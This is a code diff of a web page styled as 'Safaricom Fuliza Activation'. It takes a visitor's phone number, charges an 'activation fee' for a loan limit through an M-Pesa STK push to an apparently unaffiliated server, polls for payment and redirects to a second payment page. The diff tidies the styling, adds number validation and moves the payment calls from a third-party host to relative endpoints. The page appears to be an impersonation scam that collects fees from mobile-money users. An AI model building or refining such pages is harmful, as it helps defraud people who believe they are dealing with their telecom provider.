@@ -3,154 +3,244 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Activate Your Fuliza Limit</title>
+<title>Fuliza Activation</title>
 
 <style>
-body{font-family:Arial;background:#f4f6f9;margin:0}
-.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px}
-.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center}
-.info{margin:10px 0;font-size:16px}
-input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px}
-.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer}
-.pay-btn:hover{background:#179937}
-.spinner{margin-top:15px;display:none}
-.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto}
-@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-.message{margin-top:15px;font-size:14px}
+
+body{
+font-family:Arial, sans-serif;
+background:#f4f6f9;
+margin:0;
+}
+
+.top-bar{
+background:#1fb141;
+padding:14px;
+text-align:center;
+color:white;
+font-weight:bold;
+font-size:18px;
+}
+
+.container{
+max-width:420px;
+margin:60px auto;
+background:white;
+padding:30px;
+border-radius:12px;
+box-shadow:0 6px 18px rgba(0,0,0,0.1);
+text-align:center;
+}
+
+.info{
+margin:10px 0;
+font-size:16px;
+}
+
+input{
+width:100%;
+padding:12px;
+margin-top:15px;
+border:1px solid #ddd;
+border-radius:6px;
+font-size:16px;
+box-sizing:border-box;
+}
+
+.pay-btn{
+margin-top:20px;
+width:100%;
+padding:14px;
+background:#1fb141;
+border:none;
+color:white;
+font-size:16px;
+border-radius:30px;
+cursor:pointer;
+}
+
+.pay-btn:hover{
+background:#179937;
+}
+
+.spinner{
+display:none;
+margin-top:20px;
+}
+
+.loader{
+border:4px solid #f3f3f3;
+border-top:4px solid #1fb141;
+border-radius:50%;
+width:32px;
+height:32px;
+animation:spin 1s linear infinite;
+margin:auto;
+}
+
+@keyframes spin{
+0%{transform:rotate(0deg);}
+100%{transform:rotate(360deg);}
+}
+
+.message{
+margin-top:15px;
+font-size:14px;
+}
+
 </style>
 </head>
 
 <body>
 
-<header class="top-bar">Safaricom Fuliza Activation</header>
+<div class="top-bar">Safaricom Fuliza Activation</div>
 
-<div class="payment-box">
+<div class="container">
 
 <h2>Activate Your Fuliza Limit</h2>
 
-<div class="info">Selected Limit: <strong id="limit"></strong></div>
-<div class="info">Activation Fee: <strong id="fee"></strong></div>
+<div class="info">
+Selected Limit:
+<strong id="limit"></strong>
+</div>
 
-<input type="tel" id="phone" placeholder="Enter Safaricom Number">
+<div class="info">
+Activation Fee:
+<strong id="fee"></strong>
+</div>
 
-<button class="pay-btn" onclick="payNow()">Pay Activation Fee</button>
+<input
+type="tel"
+id="phone"
+placeholder="Enter Safaricom Number"
+/>
+
+<button class="pay-btn" id="payBtn">
+Pay Activation Fee
+</button>
 
 <div class="spinner" id="spinner">
 <div class="loader"></div>
 </div>
 
-<div class="message" id="message"></div>
+<div class="message" id="msg"></div>
 
 </div>
 
 <script>
 
-const selectedAmount = localStorage.getItem("selectedAmount") || "5000";
-const activationFee = localStorage.getItem("activationFee") || "50";
+const limit = localStorage.getItem("selectedAmount") || "5000";
+const fee = localStorage.getItem("activationFee") || "50";
 
-document.getElementById("limit").innerText="KSh "+selectedAmount;
-document.getElementById("fee").innerText="KSh "+activationFee;
+document.getElementById("limit").innerText = "KSh " + limit;
+document.getElementById("fee").innerText = "KSh " + fee;
 
-function formatPhone(phone){
-if(phone.startsWith("07")) return "254"+phone.slice(1);
-if(phone.startsWith("01")) return "254"+phone.slice(1);
-return phone;
+function formatPhone(num){
+
+if(num.startsWith("07") || num.startsWith("01")){
+return "254" + num.substring(1);
 }
 
-async function payNow(){
+return num;
 
-const phoneInput=document.getElementById("phone").value.trim();
-const msg=document.getElementById("message");
-const spinner=document.getElementById("spinner");
+}
 
-if(!phoneInput){
-msg.innerText="Enter phone number";
+function isValid(num){
+return /^(07|01)[0-9]{8}$/.test(num) || /^2547[0-9]{8}$/.test(num) || /^2541[0-9]{8}$/.test(num);
+}
+
+document.getElementById("payBtn").onclick = async function(){
+
+const phoneInput = document.getElementById("phone").value.trim();
+const msg = document.getElementById("msg");
+const spinner = document.getElementById("spinner");
+const btn = document.getElementById("payBtn");
+
+if(!phoneInput || !isValid(phoneInput)){
+msg.innerText="Enter a valid Safaricom number";
 msg.style.color="red";
 return;
 }
 
-const phone=formatPhone(phoneInput);
+const phone = formatPhone(phoneInput);
 
+btn.disabled = true;
 spinner.style.display="block";
-msg.innerText="Sending STK Push...";
-msg.style.color="black";
+msg.innerText="Processing payment...";
 
 try{
 
-const res=await fetch("https://mpayafrica-server.onrender.com/stkpush",{
-
+const res = await fetch("/stkpush",{
 method:"POST",
-headers:{"Content-Type":"application/json"},
-
+headers:{
+"Content-Type":"application/json"
+},
 body:JSON.stringify({
 phone:phone,
-amount:Number(activationFee)
+amount:Number(fee),
+reference:"FZA"+Date.now()
 })
-
 });
 
-const data=await res.json();
-
-spinner.style.display="none";
+const data = await res.json();
 
 if(data.success){
 
-const checkoutID=data.data.CheckoutRequestID;
+msg.innerText="Check your phone and enter M-Pesa PIN.";
 
-msg.innerText="STK Push sent. Enter your M-Pesa PIN.";
-msg.style.color="green";
-
-checkPayment(checkoutID);
+pollPayment(data.reference);
 
 }else{
 
-msg.innerText="Payment failed: "+data.message;
-msg.style.color="red";
-
-}
-
-}catch(err){
-
+msg.innerText="Payment could not be started. Try again.";
+btn.disabled=false;
 spinner.style.display="none";
-msg.innerText="Server error. Try again.";
-msg.style.color="red";
+
+}
+
+}catch(e){
+
+msg.innerText="Connection error. Try again.";
+btn.disabled=false;
+spinner.style.display="none";
 
 }
 
 }
 
-async function checkPayment(reference){
+async function pollPayment(reference){
 
-const msg=document.getElementById("message");
+const msg = document.getElementById("msg");
+let tries = 0;
 
-let attempts=0;
+const timer = setInterval(async()=>{
 
-const interval=setInterval(async()=>{
+tries++;
 
-attempts++;
+if(tries > 40){
 
-if(attempts>25){
-clearInterval(interval);
-msg.innerText="Payment timeout. Please try again.";
-msg.style.color="red";
+clearInterval(timer);
+msg.innerText="Payment verification failed. Try again.";
+document.getElementById("payBtn").disabled=false;
+document.getElementById("spinner").style.display="none";
 return;
+
 }
 
 try{
 
-const res=await fetch("https://mpayafrica-server.onrender.com/receipt/"+reference);
-const data=await res.json();
+const res = await fetch("/receipt/" + reference);
+const data = await res.json();
 
 if(data.success){
 
-const status=data.receipt.status;
+const status = data.receipt.status;
 
 if(status==="success"){
 
-clearInterval(interval);
+clearInterval(timer);
 
-msg.innerText="Payment successful. Redirecting...";
-msg.style.color="green";
+msg.innerText="Payment received.";
 
 setTimeout(()=>{
 window.location.href="payment2.html";
@@ -160,10 +250,11 @@ window.location.href="payment2.html";
 
 if(status==="failed"){
 
-clearInterval(interval);
+clearInterval(timer);
 
-msg.innerText="Payment failed or cancelled.";
-msg.style.color="red";
+msg.innerText="Payment not completed.";
+document.getElementById("payBtn").disabled=false;
+document.getElementById("spinner").style.display="none";
 
 }
 
